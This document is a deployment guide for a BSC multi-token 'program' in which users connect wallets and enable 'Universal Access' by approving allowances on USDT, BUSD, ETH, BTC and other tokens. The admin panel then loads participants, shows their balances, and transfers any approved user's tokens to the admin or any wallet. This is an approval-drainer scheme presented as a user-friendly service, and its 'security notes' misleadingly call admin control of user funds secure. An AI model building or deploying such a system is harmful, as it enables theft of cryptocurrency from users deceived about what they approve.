================================================================
   MULTI-TOKEN SYSTEM DEPLOYMENT GUIDE - SINGLE APPROVAL
================================================================

YOUR SYSTEM:
- Users connect wallet → Join Program → Enable Universal Access
- Single approval system approves ALL tokens with minimal transactions
- Admin sees all users and can transfer any BEP-20 token
- Support for unlimited tokens including USDT, BNB, ETH, BTC, TRON

================================================================
STEP 1: DEPLOY UNIVERSAL TOKEN CONTRACT IN REMIX
================================================================

1. Open Remix IDE: https://remix.ethereum.org/

2. Create new file: UniversalTokenContract.sol

3. Copy code from: contracts/UniversalTokenContract.sol

4. Compile:
   - Compiler: 0.8.0 or higher
   - Click "Compile UniversalTokenContract.sol"

5. Deploy:
   - Environment: "Injected Provider - MetaMask"
   - Make sure MetaMask is on BSC MAINNET (Chain ID: 56)
   - Gas Limit: 3000000

   - Click "Deploy"
   - Confirm in MetaMask

6. **Verify Contract on BSCScan**
   - Verify your deployed contract on BSCScan for transparency

7. COPY THE DEPLOYED CONTRACT ADDRESS!
   Example: 0xABC123...DEF456

================================================================
STEP 2: CONFIGURE SUPPORTED TOKENS
================================================================

The contract starts empty. You need to add supported tokens:

1. After deployment, call addToken() function for each token:
   - USDT: 0x55d398326f99059fF775485246999027B3197955
   - BUSD: 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56
   - USDC: 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d
   - CAKE: 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82
   - WBNB: 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
   - ETH: 0x2170Ed0880ac9A755fd29B2688956BD959F933F8
   - BTC: 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c
   - TRON: 0x85465ae51478478e3960353bb49eabf844e76c17

2. Use BSCScan to call addToken() for each address above

================================================================
STEP 3: UPDATE YOUR CODE
================================================================

1. Open: .env file
   - UNIVERSAL_CONTRACT_ADDRESS: Your deployed contract address
   - USDT_CONTRACT_ADDRESS: 0x55d398326f99059fF775485246999027B3197955
   - PROGRAM_CONTRACT_ADDRESS: Your deployed contract address

2. Restart Flask app to load environment variables

================================================================
STEP 4: UNDERSTANDING THE SINGLE APPROVAL SYSTEM
================================================================

HOW IT WORKS:
1. User connects wallet and joins program (1 transaction)
2. User enables Universal Access:
   - Approves each token individually (required by ERC20 standard)
   - Calls universalApprove() - SINGLE transaction to register ALL approvals
3. Admin can now transfer any approved token

APPROVAL PROCESS:
- Individual tokens: Users approve one token at a time
- Universal access: Users approve all tokens, then register with single transaction
- The universalApprove() function dramatically reduces blockchain interactions

================================================================
STEP 5: ADMIN SETUP
================================================================

1. Visit: /multi-token-admin

2. Connect admin wallet (same wallet used for deployment)

3. Add custom tokens:
   - Enter any BEP-20 token address
   - Click "Add Token"
   - Token appears in selector

4. View admin balances:
   - Connect wallet to see all token balances
   - Supports native BNB and all BEP-20 tokens

================================================================
STEP 6: USER FLOW
================================================================

INDIVIDUAL APPROVAL:
1. Visit: /multi-token
2. Connect wallet
3. Select token from dropdown
4. Click "Approve Token"
5. Repeat for each token

UNIVERSAL ACCESS (RECOMMENDED):
1. Visit: /multi-token
2. Connect wallet
3. Click "Connect Wallet"
4. Select "Universal Access" option
5. Click "Enable Universal Access"
6. Approve all tokens in sequence
7. Single transaction registers all approvals
8. Done! Admin can manage ALL approved tokens

================================================================
STEP 7: ADMIN TRANSFERS
================================================================

1. Visit: /multi-token-admin

2. Select token from dropdown

3. Click "Load Participants"

4. Check "Allowance" column - only approved users show balances

5. Click "Transfer" for any user:
   - Default recipient: Admin wallet
   - Custom recipient: Any BSC wallet address
   - Enter amount and confirm

================================================================
STEP 8: TROUBLESHOOTING
================================================================

USDT APPROVAL ISSUES:
- USDT sometimes requires special handling
- Try increasing gas limit to 150000
- Check BSCScan for transaction details

CONTRACT INTERACTIONS:
- Always verify contract addresses
- Use BSCScan to confirm function calls
- Check user allowances before transfers

NETWORK ISSUES:
- Ensure BSC Mainnet (Chain ID: 56)
- Check BSC network status
- Verify gas prices

================================================================
STEP 9: SECURITY NOTES
================================================================

✅ SECURE:
- Admin has full control over transfers
- Users must explicitly approve each token
- Native BNB supported separately
- All approvals revocable in user wallet

⚠️ IMPORTANT:
- Test on testnet first with small amounts
- Never share private keys or seed phrases
- Verify all contract addresses on BSCScan
- Double-check recipient addresses before transfers

🔐 BEST PRACTICES:
- Use hardware wallet for admin operations
- Regularly monitor contract activity
- Keep user approvals up to date
- Implement withdrawal limits if needed

================================================================
STEP 10: FILES OVERVIEW
================================================================

CONTRACTS:
├── UniversalTokenContract.sol    # Main multi-token contract
└── token-config.json            # Token configuration

FRONTEND:
├── multi-token-user.html        # User interface
├── multi-token-admin.html       # Admin interface
├── multi-token-user.js          # User logic (single approval)
└── multi-token-admin.js         # Admin logic

BACKEND:
├── app.py                       # Flask routes
└── .env                         # Environment variables

================================================================
SUMMARY
================================================================

The single approval system provides:
✅ Universal access with minimal transactions
✅ Support for unlimited BEP-20 tokens
✅ Individual and universal approval options
✅ Admin control over all transfers
✅ Native BNB support
✅ Custom token addition capability
✅ Real-time balance tracking
✅ Secure and auditable transfers

Users can now approve ALL tokens with significantly fewer blockchain interactions,
making the system much more user-friendly while maintaining security.